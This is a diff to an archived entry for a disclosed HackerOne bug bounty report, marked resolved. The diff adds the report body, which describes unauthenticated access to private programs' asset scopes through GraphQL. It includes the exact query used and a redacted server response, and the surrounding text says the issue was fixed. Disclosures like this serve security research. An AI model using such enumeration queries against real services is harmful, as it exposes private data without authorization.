@@ -7,6 +7,7 @@ tags:
 substate: "resolved"
 weakness: null
 enriched: true
+body: true
 date: 2025-01-21
 submitted: 2022-06-28T17:29:11.263Z
 bounty_usd: 25000
@@ -31,6 +32,32 @@ This vulnerability allowed unauthorized users to retrieve sensitive information 
 Attackers could enumerate {id} values and expose private data, including program names, scope details, and the titles of reports belonging to those programs.
 
 The HackerOne team promptly addressed the issue, recognizing its critical severity, and awarded a generous bounty for its discovery.
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+**Summary:**
+Hi team, I understand what's going on
+**Description:**
+Just a recent update gives the results of private programs
+### Steps To Reproduce
+
+Without authorization
+
+GraphQL: 
+`{"query":"{node(id:\"gid://hackerone/PolicyPageAssetGroupsIndex::PolicyPageAssetGroup/3981-41287\"){... on PolicyPageAssetGroupDocument{id,name}}}"}`
+
+Answer:
+`{"data":{"node":{"id":"Z2lkOi8vaGFja2Vyb25lL1BvbGljeVBhZ2VBc3NldEdyb3Vwc0luZGV4OjpQb2xpY3lQYWdlQXNzZXRHcm91cC8zOTgxLTQxMjg3","name":"██████"}}}`
+
+This is Asset program - █████████
+
+Thanks!
+
+## Impact
+
+Disclosing Sсope(Assets) in Private Programs
 
 ## Timeline
 
